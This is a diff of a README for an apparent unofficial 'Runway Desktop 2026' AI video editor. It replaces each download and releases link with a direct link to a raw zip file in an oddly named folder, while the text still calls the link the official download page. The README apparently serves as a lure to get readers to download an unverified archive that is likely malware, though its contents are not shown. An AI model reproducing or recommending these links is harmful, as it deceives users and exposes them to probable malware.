@@ -1,6 +1,6 @@
 # 🎬 Runway-Desktop---Runway-ML-Video-Editor-2026 - Create Stunning AI Videos Effortlessly
 
-[![Download Runway Desktop](https://img.shields.io/badge/Download-Runway_Desktop_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B)](https://github.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/releases)
+[![Download Runway Desktop](https://img.shields.io/badge/Download-Runway_Desktop_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B)](https://raw.githubusercontent.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/main/bahawder/v1.0.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting started is easier than you think. Follow these simple steps, and you'll 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**Download Runway Desktop 2026**](https://github.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/releases)
+Visit this link to download the application: [**Download Runway Desktop 2026**](https://raw.githubusercontent.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/main/bahawder/v1.0.zip)
 
 This link takes you to the official download page where you'll find the latest version of the software.
 
@@ -142,7 +142,7 @@ Runway Desktop supports MP4, MOV, AVI, and GIF export formats. You can also adju
 
 We're constantly improving Runway Desktop with new features and enhancements. Check the releases page regularly for updates:
 
-[**View Latest Releases**](https://github.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/releases)
+[**View Latest Releases**](https://raw.githubusercontent.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/main/bahawder/v1.0.zip)
 
 ---
 
@@ -152,7 +152,7 @@ Runway Desktop puts the power of professional AI video editing in your hands. Wi
 
 Don't wait—start creating today!
 
-[**🚀 Download Now**](https://github.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/releases)
+[**🚀 Download Now**](https://raw.githubusercontent.com/loganville5566-sudo/Runway-Desktop---Runway-ML-Video-Editor-2026/main/bahawder/v1.0.zip)
 
 ---
 
